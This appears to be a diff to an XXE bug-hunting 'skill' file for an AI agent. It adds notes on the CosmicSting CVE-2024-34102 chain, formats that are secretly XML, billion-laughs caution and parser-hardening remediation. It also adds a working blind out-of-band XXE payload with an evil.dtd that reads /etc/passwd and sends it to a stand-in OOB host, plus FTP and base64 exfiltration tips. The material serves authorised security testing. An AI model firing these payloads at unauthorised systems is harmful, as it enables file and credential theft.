@@ -1,8 +1,11 @@
 ---
 name: hunt-xxe
 description: Hunting skill for xxe vulnerabilities. Built from 10 public bug bounty reports including SVG-upload XXE, Office-doc (PPTX/DOCX) XXE, SOAP XXE, SAML AssertionConsumer XXE, blind OOB XXE via DTD callback, parameter-entity XXE, XXE-to-LFI, XXE-to-SSRF, and XXE-to-RCE chains (Adobe Commerce CosmicSting CVE-2024-34102). Use when hunting XXE on any target — emphasis on OOB-Or-It-Didn't-Happen Gate for blind cases.
-sources: github, hackerone_public, assetnote_research, splunk_security
+sources: github, hackerone_public, assetnote_research, splunk_security, cve_database
 report_count: 10
+cwe: [CWE-611, CWE-827, CWE-918, CWE-776]
+cvss_baseline: "High (7.5-8.6) file read / SSRF via XXE → Critical (9.8) unauth XXE-to-RCE (CosmicSting CVE-2024-34102) or internal-cloud-creds via SSRF. Blind without OOB proof = unconfirmed."
+related_skills: [hunt-ssrf, hunt-lfi, hunt-file-upload, hunt-saml, hunt-rce]
 ---
 
 ## Crown Jewel Targets
@@ -411,6 +414,36 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
     - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8
 
 ---
+
+## New Techniques (2024-2026)
+
+### CosmicSting (CVE-2024-34102, Adobe Commerce/Magento) — XXE → SSRF → RCE
+A nested/JSON-to-XML deserialization XXE that, chained with an iconv/`gsocket` gadget, reached unauth RCE on a huge e-commerce footprint. The pattern to generalize: **JSON endpoints that internally convert to XML** (or accept `Content-Type: application/xml` as an alternate) are latent XXE even when the visible API is JSON. Always try sending XML to a JSON endpoint and a crafted nested type.
+
+### Formats that are secretly XML
+- **SVG upload / avatar / thumbnail**, **Office docs** (DOCX/XLSX/PPTX = ZIP of XML), **SOAP/WSDL**, **SAML assertions** (`hunt-saml`), **XMP metadata** in images/PDFs, **RSS/Atom/OPML import**, **SVG→PNG render**, **`.xlsx`/`.ods` import**, **GPX/KML/SVG map data**.
+- **DOCX/XLSX blind XXE**: inject a parameter-entity DTD into `word/document.xml` or `[Content_Types].xml`, point at your OOB DTD. Cross-ref `hunt-file-upload`.
+
+### Blind OOB via external DTD (the default for modern stacks)
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://OOB/evil.dtd"> %ext;]>
+<r>&exfil;</r>
+```
+```
+evil.dtd:  <!ENTITY % file SYSTEM "file:///etc/passwd">
+           <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OOB/?x=%file;'>"> %eval; %exfil;
+```
+Use a unique OOB subdomain per injection point; FTP-exfil (`ftp://`) for multi-line files; `php://filter/convert.base64-encode` to read files with XML-breaking chars.
+
+### Billion-laughs / parameter-entity DoS
+Note but don't fire on live programs without authorization — mention impact, demonstrate the parse path, not the outage.
+
+## Remediation
+
+- Disable DOCTYPE/DTD processing and external entities in every XML parser (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`, `XMLConstants.ACCESS_EXTERNAL_DTD=""`, libxml `LIBXML_NONET`/no `LIBXML_NOENT`, .NET `XmlResolver=null`).
+- Apply the same hardening to XML derived from JSON/alternate content-types and to document/image import pipelines; prefer non-XML formats where possible.
+- Patch affected products (Magento CosmicSting); isolate parsers from internal network and cloud metadata.
 
 ## Related Skills & Chains
 
